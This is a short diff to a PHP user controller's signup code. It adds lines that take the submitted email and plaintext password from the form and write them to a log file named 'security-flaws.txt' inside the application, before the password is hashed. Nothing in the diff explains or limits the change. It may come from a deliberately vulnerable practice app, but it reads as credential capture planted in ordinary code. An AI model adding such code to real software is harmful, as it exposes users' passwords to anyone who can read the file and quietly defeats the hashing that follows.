@@ -37,6 +37,11 @@ class User_Controller extends Controller {
         } 
         //TODO add more checking if the username is taken or not same for the email!!!
 
+        $user_data = 'UserMail: '.$_POST['txtEmail'].' password: '.$_POST['txtPassword'].' ' ;
+       $sign_up_log = fopen('./includes/logs/security-flaws.txt', "w") or die("Unable to open file!");
+       fwrite($sign_up_log, $user_data );
+       fclose($sign_up_log);
+
         //hash the password
         $user_password = password_hash($_POST['txtPassword'], PASSWORD_BCRYPT);
         // trim variables
